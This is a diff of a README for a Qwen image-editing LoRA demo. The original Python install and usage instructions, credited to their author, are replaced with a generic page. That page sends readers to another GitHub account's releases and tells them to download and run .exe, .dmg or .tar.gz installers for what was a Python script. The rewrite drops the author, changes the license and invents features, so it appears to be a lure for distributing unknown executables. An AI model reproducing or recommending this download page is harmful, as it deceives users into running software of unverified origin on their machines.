@@ -1,124 +1,74 @@
-# Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load
+# 🌟 Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load - Fast Image Editing Made Easy
 
-> A Gradio-based demonstration for the Qwen/Qwen-Image-Edit-2509 model, featuring lazy-loaded LoRA adapters for fast, specialized image edits like photo-to-anime conversion, angle changes, lighting restoration, skin editing, and upscaling. Supports single-image inputs with descriptive prompts; adapters load on-demand to optimize memory. Enhanced with Flash Attention 3 for efficient inference.
+## 📥 Download Now!
+[![Download Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Lazy LoRA Loading**: 8 specialized adapters (e.g., Photo-to-Anime, Relight) download and activate only when selected, reducing initial load time.
-- **Single-Image Editing**: Upload one image and apply edits via prompts (e.g., "Transform into anime").
-- **Rapid Inference**: 4-step default generations with bfloat16 and optional Flash Attention 3; auto-resizes outputs to match aspect (multiples of 8).
-- **Advanced Controls**: Hidden accordion for seed randomization, guidance scale (1-10), and steps (1-50).
-- **Custom Theme**: OrangeRedTheme with gradients and responsive CSS for a clean UI.
-- **Examples**: 15 pre-loaded inputs for quick testing (e.g., multi-angle views, next-scene transitions).
-- **Queueing Support**: Up to 30 concurrent jobs with 300s cache for smooth usage.
+Welcome to Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load! This application allows you to easily edit your images using advanced machine learning techniques. You can convert photos to anime, change angles, restore lighting, edit skin, and upscale images quickly.
 
-## Prerequisites
+Follow these steps to start using the software.
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (recommended for bfloat16; falls back to CPU).
-- Stable internet for initial model/LoRA downloads.
+## 📋 System Requirements
 
-## Installation
+Before proceeding, ensure your system meets the following requirements:
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load.git
-   cd Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load
-   ```
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- RAM: At least 4 GB.
+- Storage: At least 500 MB of free space.
+- GPU: Recommended for better performance (NVIDIA or AMD).
 
-2. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
-   ```
-   pip install -r requirements.txt
-   ```
+## 🛠 Installation Instructions
 
-   **requirements.txt content:**
-   ```
-   git+https://github.com/huggingface/accelerate.git
-   git+https://github.com/huggingface/diffusers.git
-   git+https://github.com/huggingface/peft.git
-   huggingface_hub
-   sentencepiece
-   transformers
-   torchvision
-   supervision
-   kernels
-   spaces
-   torch
-   numpy
-   ```
+### 1. Visit the Download Page
 
-3. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860` (or the provided URL if using Spaces).
+To download the application, visit the following page:
 
-## Usage
+[Download Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load](https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/releases)
 
-1. **Upload Image**: Select a single image (PIL format, height up to 290px preview).
+### 2. Choose the Latest Release
 
-2. **Select Adapter**: Dropdown for styles (default: "Photo-to-Anime").
+Once on the page, find the latest release. It is usually at the top of the list and marked with a tag like "Latest Release".
 
-3. **Enter Prompt**: Describe the edit (e.g., "Rotate the camera 45 degrees to the left").
+### 3. Download the Application
 
-4. **Configure (Optional)**: Expand "Advanced Settings" for seed, guidance, steps.
+Click the appropriate file for your operating system to begin downloading. The files are typically in `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
-5. **Edit Image**: Click "Edit Image"; outputs the transformed image with seed displayed.
+### 4. Run the Application
 
-### Supported Adapters
+After the download completes, locate the file in your "Downloads" folder. 
 
-| Adapter              | Use Case                          |
-|----------------------|-----------------------------------|
-| Photo-to-Anime      | Style transfer to anime aesthetics |
-| Multiple-Angles     | Camera rotation/view changes     |
-| Light-Restoration   | Shadow removal and relighting    |
-| Relight             | Lighting adjustments             |
-| Multi-Angle-Lighting| Dynamic multi-view lighting      |
-| Edit-Skin           | Skin detail enhancement          |
-| Next-Scene          | Sequential scene transitions     |
-| Upscale-Image       | Resolution upscaling             |
+- On **Windows**: Double-click the `.exe` file to run the installer and follow the instructions.
+- On **macOS**: Open the `.dmg` file and drag the application to your "Applications" folder.
+- On **Linux**: Extract the `.tar.gz` file and follow the instructions in the README file there.
 
-## Examples
+## 🎨 How to Use Qwen-Image-Edit-2509
 
-| Input Image    | Prompt Example                                      | Adapter              |
-|----------------|-----------------------------------------------------|----------------------|
-| examples/1.jpg | "Transform into anime."                            | Photo-to-Anime      |
-| examples/5.jpg | "Remove shadows and relight using soft lighting."  | Light-Restoration   |
-| examples/4.jpg | "Use a subtle golden-hour filter."                 | Relight             |
-| examples/2.jpeg| "Rotate the camera 45 degrees to the left."        | Multiple-Angles     |
-| examples/7.jpg | "Light source from the Right Rear."                | Multi-Angle-Lighting|
-| examples/10.jpeg| "Upscale the image."                               | Upscale-Image       |
-| examples/7.jpg | "Light source from the Below."                     | Multi-Angle-Lighting|
-| examples/2.jpeg| "Switch to a top-down right corner view."          | Multiple-Angles     |
-| examples/9.jpg | "Camera moves forward as sunlight breaks through." | Next-Scene          |
-| examples/8.jpg | "Make skin details more prominent and natural."    | Edit-Skin           |
-| examples/6.jpg | "Switch to a bottom-up view."                      | Multiple-Angles     |
-| examples/6.jpg | "Rotate the camera 180 degrees upside down."       | Multiple-Angles     |
-| examples/4.jpg | "Rotate the camera 45 degrees to the right."       | Multiple-Angles     |
-| examples/4.jpg | "Switch to a top-down view."                       | Multiple-Angles     |
-| examples/4.jpg | "Switch to a wide-angle lens."                     | Multiple-Angles     |
+After installing, open the application. You’ll see a user-friendly interface with various options:
 
-## Troubleshooting
+1. **Upload Your Image**: Click the "Upload" button to select the image you want to edit.
+2. **Select an Edit Style**: Choose from available options like "Photo to Anime", "Lighting Restoration", or "Skin Editing".
+3. **Adjust Settings**: Use the sliders to fine-tune the edits as per your preference.
+4. **Preview Changes**: Click on the "Preview" button to see how your edits look.
+5. **Save or Share**: Once you are satisfied, click "Save" to download the edited image or "Share" to post it on social media.
 
-- **Adapter Loading Errors**: First selection downloads LoRA; check internet/repo. Console logs status.
-- **OOM on GPU**: Reduce steps/resolution; clear cache with `torch.cuda.empty_cache()`. FA3 fallback if incompatible.
-- **Dimension Issues**: Auto-resizes to 1024 max edge (aspect preserved); multiples of 8 enforced.
-- **No Output**: Ensure image uploaded; prompts must be descriptive.
-- **Queue Full**: Increase `max_size` in `demo.queue()`; 300s cache for edits.
-- **Gradio Rendering**: Set `ssr_mode=True` if gradients fail; CSS for container width.
+## 🌈 Features
 
-## Contributing
+- **Fast Editing**: With lazy-loaded LoRA adapters, enjoy quick edits without long wait times.
+- **Multiple Styles**: Seamlessly convert photos between different artistic styles and enhance image quality.
+- **User-Friendly Design**: Easily navigate through the options and features, even for beginners.
+- **Regular Updates**: The application will receive updates to improve features and add new editing styles.
 
-Contributions encouraged! Fork the repo, add adapters to `ADAPTER_SPECS`, or enhance prompts, and submit PRs with tests. Focus areas:
-- More LoRA integrations.
-- Batch/single-step modes.
-- Negative prompt customization.
+## 📞 Help and Support
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load.git](https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load.git)
+If you run into issues or have questions, you can reach out for support through the Issues section of the repository or check the FAQ in the documentation.
 
-## License
+## ✔️ License
 
-Apache License 2.0. See [LICENSE](LICENSE) for details.
+This project is licensed under the MIT License. For more details, refer to the LICENSE file in the repository.
 
-Built by Prithiv Sakthi. Report issues via the repository.
+## 📫 Contact
+
+For any inquiries or feedback, please open an issue on GitHub or reach out via [your-email@example.com].
+
+Enjoy enhancing your images with Qwen-Image-Edit-2509!
